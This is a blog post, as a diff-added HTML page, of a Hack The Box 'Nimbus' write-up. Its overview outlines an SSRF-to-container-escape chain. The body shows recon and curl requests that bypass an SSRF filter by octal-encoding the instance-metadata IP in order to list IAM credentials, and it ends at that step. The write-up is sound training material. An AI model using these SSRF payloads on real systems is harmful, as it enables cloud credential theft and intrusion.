@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/11/18/hackthebox-nimbus/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewNimbus is a hard-difficulty linux machine from Hack The Box that starts with a Server-Side Request Forgery (SSRF) vulnerability in a job-submission feature that fetches arbitrary URLs for us.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Nimbus">
+<meta property="og:url" content="http://fouedsaidi.com/2026/11/18/Hackthebox-Nimbus/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewNimbus is a hard-difficulty linux machine from Hack The Box that starts with a Server-Side Request Forgery (SSRF) vulnerability in a job-submission feature that fetches arbitrary URLs for us.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Nimbus/Nimbus.png">
+<meta property="article:published_time" content="2026-11-18T16:42:10.000Z">
+<meta property="article:modified_time" content="2026-11-19T16:59:38.150Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Linux-PE">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="IMDS">
+<meta property="article:tag" content="LocalStack">
+<meta property="article:tag" content="SQS">
+<meta property="article:tag" content="CodeBuild">
+<meta property="article:tag" content="Container-Escape">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Nimbus/Nimbus.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Nimbus -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Nimbus</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-11-18 19:42:10</span>
+        <span class="mobile">2026-11-18 19:42:10</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-11-19 19:59:38</span>
+            <span class="mobile">2026-11-19 19:59:38</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux-PE/">Linux-PE</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SSRF/">SSRF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AWS/">AWS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/IMDS/">IMDS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/LocalStack/">LocalStack</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SQS/">SQS</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CodeBuild/">CodeBuild</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Container-Escape/">Container-Escape</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Nimbus is a hard-difficulty linux machine from Hack The Box that starts with a Server-Side Request Forgery (SSRF) vulnerability in a job-submission feature that fetches arbitrary URLs for us. By octal-encoding the IP of the instance metadata service we bypass the “metadata endpoints are blocked” filter and steal temporary STS credentials for the <code>nimbus-web-role</code>. That role can only list SQS queues, but the queue URL leaks the internal hostname of a LocalStack container named <code>floci</code>. Using the SSRF a second time with a decimal-encoded IP, we sweep the Docker bridge, locate LocalStack on port <code>4566</code>, and read the worker source straight out of its unauthenticated S3. The worker deserialises jobs with the unsafe YAML loader and runs an attacker-controlled <code>script</code> field through <code>python3 -c</code>, so sending a message to the queue gives us a reverse shell as <code>worker</code> and <code>user.txt</code>. Inside the container we find the internal LocalStack runs with IAM enforcement off, giving us unauthenticated access to CodeBuild, which we abuse with a <code>privilegedMode</code> build and a writable <code>/proc/sys/kernel/modprobe</code> usermode-helper trigger to execute code as host root and read <code>root.txt</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Nimbus/Nimbus.png"
+                      alt="Nimbus-info-card"
+                ><figcaption>Nimbus-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We start with a full TCP sweep with version detection and the default scripts:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- --min-rate 2000 -oN nmap_full.txt 10.129.33.240</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE    SERVICE VERSION</span><br><span class="line">22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)</span><br><span class="line">|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)</span><br><span class="line">80/tcp    open     http    nginx 1.24.0 (Ubuntu)</span><br><span class="line">|_http-title: Nimbus \xE2\x80\x94 Internal Job Scheduler</span><br><span class="line">|_http-server-header: nginx/1.24.0 (Ubuntu)</span><br><span class="line">24876/tcp filtered unknown</span><br><span class="line">32345/tcp filtered unknown</span><br><span class="line">39166/tcp filtered unknown</span><br><span class="line">42407/tcp filtered unknown</span><br><span class="line">64367/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>We have our usual SSH port 22 and a web application on port 80 titled “Nimbus — Internal Job Scheduler”. The handful of high <code>filtered</code> ports look like container&#x2F;cloud plumbing behind the proxy — nothing to hit directly — so the website it is. We add the obvious vhost to our hosts file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.33.240 nimbus.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Web-Application-Nimbus-Job-Scheduler"><a href="#Web-Application-Nimbus-Job-Scheduler" class="headerlink" title="Web Application - Nimbus Job Scheduler"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://nimbus.htb/" >Nimbus Job Scheduler <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://nimbus.htb/</span><br></pre></td></tr></table></figure></div>
+
+<p>The landing page is plain, but the copy is doing a lot of talking:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Nimbus<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tag&quot;</span>&gt;</span>Internal job scheduler — Nimbus Labs Engineering<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/jobs&quot;</span>&gt;</span>Submit Job<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/login&quot;</span>&gt;</span>Sign In<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>What is this?<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Nimbus runs scheduled and on-demand background jobs across our worker fleet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>How do I submit a job?<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Drop the YAML in our internal Git, then point the</span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/jobs&quot;</span>&gt;</span>job submitter<span class="tag">&lt;/<span class="name">a</span>&gt;</span> at the raw URL. Or paste the YAML directly for ad-hoc runs.<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;meta&quot;</span>&gt;</span>nimbus v1.4.2 · <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/api/v1/health&quot;</span>&gt;</span>healthcheck<span class="tag">&lt;/<span class="name">a</span>&gt;</span> · <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/docs&quot;</span>&gt;</span>docs<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>There’s a health endpoint advertised, so we check it — and it leaks the backend topology straight away:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://nimbus.htb/api/v1/health</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;services&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;queue&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://aws.nimbus.htb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;ok&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;scheduler&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://aws.nimbus.htb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;ok&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;storage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://aws.nimbus.htb&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;ok&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;healthy&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.4.2&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The queue, scheduler, and storage all live behind <code>aws.nimbus.htb</code>. That’s a second vhost we’ll need, so it goes in the hosts file too:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.129.33.240 aws.nimbus.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>Now the actual feature — <code>/jobs</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://nimbus.htb/jobs</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/jobs/preview&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;url&quot;</span>&gt;</span>Raw Git URL<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;https://gitlab.example.com/devops/jobs/raw/main/backup.yaml&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;hint&quot;</span>&gt;</span>URL must point to a .yaml file. Internal addresses and metadata endpoints are blocked.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Preview Job<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;hint&quot;</span>&gt;</span>Parsed with safe_load. No code execution at submission time.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>There are two interesting things here. The “By URL” tab POSTs a <code>url</code> to <code>/jobs/preview</code> and the <strong>server goes and fetches it for us</strong> — that’s a Server-Side Request Forgery surface. And the hint underneath is practically a confession: <em>“Internal addresses and metadata endpoints are blocked.”</em> When a developer tells you exactly what they were afraid of, they’re telling you exactly where to push. Cloud box plus “metadata endpoints are blocked” means they’re scared of the instance metadata service, so that’s where we go.</p>
+<h2 id="SSRF-→-Instance-Metadata"><a href="#SSRF-→-Instance-Metadata" class="headerlink" title="SSRF → Instance Metadata"></a>SSRF → Instance Metadata</h2><p>First the honest attempt, just to see the guard rail:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://169.254.169.254/latest/meta-data/?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel err&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> Security policy: this URL targets an internal resource and has been blocked.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Blocked, as advertised. But the filter is doing string&#x2F;range matching on the IP as written, and IPv4 has more than one spelling. The classic move is to re-encode <code>169.254.169.254</code> so it doesn’t <em>look</em> like itself. Octal does the trick — each octet with a leading zero: <code>169 → 0251</code>, <code>254 → 0376</code>, giving <code>0251.0376.0251.0376</code>. We also have to satisfy the “must point to a .yaml file” check, so we bolt a junk <code>?a=test.yaml</code> on the end; the metadata service ignores the unknown query param and the validator only looks at the suffix.</p>
+<p>Listing the IAM roles bound to the instance:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
